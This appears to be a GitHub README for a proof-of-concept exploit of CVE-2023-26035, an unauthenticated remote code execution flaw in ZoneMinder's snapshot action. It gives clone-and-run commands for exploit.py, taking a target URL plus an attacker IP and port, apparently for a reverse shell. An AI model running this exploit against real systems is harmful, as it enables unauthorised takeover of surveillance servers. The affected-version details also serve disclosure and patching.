# CVE-2023-26035
Unauthenticated RCE in ZoneMinder Snapshots - PoC Exploit

![alt img](https://rvizx.github.io/CVE-2023-26035.png?raw=true)

### Description
ZoneMinder versions prior to 1.36.33 and 1.37.33 are vulnerable to Unauthenticated Remote Code Execution due to missing authorization checks in the snapshot action. 

### Usage

```
git clone https://github.com/rvizx/CVE-2023-26035
cd CVE-2023-26035
python3 exploit.py
```

```
python3 exploit.py -t <target_url> -ip <attacker-ip> -p <port>
```

#### Requirements

```
pip3 install beautifulsoup4
```

### Credits
[UnblvR](https://twitter.com/Unblvr1) discovered the vulnerability. 
